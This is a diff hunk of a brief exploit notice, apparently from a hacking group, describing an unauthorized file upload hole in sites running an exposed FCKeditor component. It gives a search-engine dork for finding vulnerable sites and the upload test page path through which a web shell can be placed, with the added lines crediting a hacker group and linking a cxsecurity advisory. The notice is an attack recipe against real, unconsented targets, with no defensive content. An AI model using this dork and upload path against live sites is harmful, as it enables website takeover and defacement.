@@ -2,3 +2,7 @@ Unauthorized File Insertation Vulnerability
 dork: inurl:/vantindat/ [use ur fucking brain]
 exploit: /jscripts/FCKeditor/editor/filemanager/upload/test.html
 shell path: [use ur fucking brain]
+
+greetz: $ KingSkrupellos & Cyberizm Digital Security Army $
+reference:
+https://cxsecurity.com/issue/WLB-2019030021
